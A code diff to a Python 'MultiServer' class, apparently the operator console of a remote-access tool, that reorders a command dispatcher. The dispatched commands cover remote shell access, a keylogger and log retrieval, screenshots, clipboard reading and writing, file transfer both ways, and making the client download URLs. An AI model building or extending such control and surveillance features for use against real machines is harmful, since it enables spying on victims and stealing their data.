@@ -591,8 +591,9 @@ class MultiServer(object):
             _, cwd = self.client_shell(conn, command)
 
     def selector(self, conn, command) -> bool:
-        if '--b' in command:
-            return True
+        if '--h' in command:
+            print(interface_help)
+            return
         if '--e' in command:
             try:
                 self.shell(conn)
@@ -605,21 +606,13 @@ class MultiServer(object):
             except (EOFError, KeyboardInterrupt):
                 print()
             return
-        if '--c' in command:
-            text_to_copy = input('Text to copy: ')
-            result, error= self.fill_clipboard(conn, text_to_copy)
-            if result:
-                print('Copied to Clipboard.')
-            else:
-                print(error)
+        if '--g' in command:
+            print('Taking Screenshot...')
+            self.screenshot(conn)
+            print('Saved Screenshot.')
             return
         if '--u' in command:
             self.get_info(conn)
-            return
-        if '--l' in command:
-            print('Transferring log...')
-            log = self.get_log(conn)
-            print('Log saved as: {}'.format(log))
             return
         if command[:3] == '--k':
             if command[4:].strip() == 'start':
@@ -640,17 +633,46 @@ class MultiServer(object):
                 else:
                     print('Keylogger ImportError')
                 return
+        if '--l' in command:
+            print('Transferring log...')
+            log = self.get_log(conn)
+            print('Log saved as: {}'.format(log))
+            return
+        if '--s' in command:
+            file_to_transfer = input('File to Transfer to Client: ')
+            save_as = input('Save as: ')
+            print('Transferring file...')
+            self.send_file(conn, file_to_transfer, save_as)
+            print('File transferred.')
+            return
+        if '--r' in command:
+            file_to_transfer = input('File to Transfer to Server: ')
+            save_as = input('Save as: ')
+            print('Transferring file...')
+            self.receive_file(conn, file_to_transfer, save_as)
+            print('File transferred.')
+            return
+        if '--d' in command:
+            file_url = input('File URL: ')
+            file_name = input('Filename: ')
+            print('Downloading File...')
+            result, error = self.download(conn, file_url, file_name)
+            if result:
+                print('Downloaded file successfully')
+            else:
+                print(error)
+            return
+        if '--c' in command:
+            text_to_copy = input('Text to copy: ')
+            result, error= self.fill_clipboard(conn, text_to_copy)
+            if result:
+                print('Copied to Clipboard.')
+            else:
+                print(error)
+            return
         if '--p' in command:
             self.get_clipboard(conn, _print=True)
             return
-        if command[:3] == '--x':
-            command = command[4:].strip()
-            if command == '1':
-                print('Restarting Session...')
-                return self.restart_session(conn)
-            elif command == '2':
-                print('Disconnecting Client...')
-                return self.disconnect(conn)
         if command[:3] == '--q':
             command = command[4:].strip()
             if command == '1':
@@ -667,38 +689,16 @@ class MultiServer(object):
                 print('Restarting Client Machine')
                 self.restart(conn)
                 return True
-        if '--d' in command:
-            file_url = input('File URL: ')
-            file_name = input('Filename: ')
-            print('Downloading File...')
-            result, error = self.download(conn, file_url, file_name)
-            if result:
-                print('Downloaded file successfully')
-            else:
-                print(error)
-            return
-        if '--s' in command:
-            file_to_transfer = input('File to Transfer to Client: ')
-            save_as = input('Save as: ')
-            print('Transferring file...')
-            self.send_file(conn, file_to_transfer, save_as)
-            print('File transferred.')
-            return
-        if '--r' in command:
-            file_to_transfer = input('File to Transfer to Server: ')
-            save_as = input('Save as: ')
-            print('Transferring file...')
-            self.receive_file(conn, file_to_transfer, save_as)
-            print('File transferred.')
-            return
-        if '--g' in command:
-            print('Taking Screenshot...')
-            self.screenshot(conn)
-            print('Saved Screenshot.')
-            return
-        if '--h' in command:
-            print(interface_help)
-            return
+        if command[:3] == '--x':
+            command = command[4:].strip()
+            if command == '1':
+                print('Restarting Session...')
+                return self.restart_session(conn)
+            elif command == '2':
+                print('Disconnecting Client...')
+                return self.disconnect(conn)
+        if '--b' in command:
+            return True
         print("Invalid command: '--h' for help.")
 
     def broadcast(self, command) -> None:
